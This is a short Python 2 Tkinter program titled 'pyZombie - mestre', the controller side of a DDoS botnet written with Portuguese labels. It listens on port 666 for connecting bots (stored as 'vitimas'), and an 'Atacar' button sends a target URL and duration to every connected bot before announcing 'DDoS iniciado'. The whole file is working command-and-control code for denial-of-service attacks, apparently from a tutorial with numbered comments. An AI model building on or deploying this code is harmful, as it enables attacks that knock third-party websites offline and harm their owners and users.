import Tkinter, tkMessageBox, socket, threading

class Aplicacao: #1

    def __init__(self, master=None):
        threading.Thread(target=self.inicia_socket).start() #2
        self.label = Tkinter.Label(root,text='Vitima') #3
        self.label.place(x=5, y=5) #4
        self.vitima = Tkinter.Entry(root,width='20') #5
        self.vitima.insert(0,'http://') #6
        self.vitima.place(x=5,y=25)
        self.label = Tkinter.Label(root,text='Tempo')
        self.label.place(x=80, y=50)
        self.tempo = Tkinter.Entry(root,width='5')
        self.tempo.insert(0,'60')
        self.tempo.place(x=125,y=50)
        self.BotaoAtacar = Tkinter.Button(root,text='Atacar',
                                          font=('Times New Roman', 20),
                                          command=self.atacar) #7
        self.BotaoAtacar.place(x=180, y=10, width=100, height=70)

    def atacar(self): #8
        for sock in vitimas: #9
            dados = self.vitima.get() + '|' + self.tempo.get() #10
            try:
                sock.send(dados) #11
            except socket.error: #12
                sock.close()
                del vitimas[vitimas.index(sock)] #13
        tkMessageBox.showinfo('Info', 'DDoS iniciado') #14

    def inicia_socket(self): #15
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(('0.0.0.0', 666))
        sock.listen(1)
        while True:
            client_socket, client_addr = sock.accept()
            vitimas.append(client_socket)

vitimas = []

root = Tkinter.Tk() #16
root.geometry('290x90')
root.resizable('False', 'False')
root.title('pyZombie - mestre')
Aplicacao(root)
root.mainloop()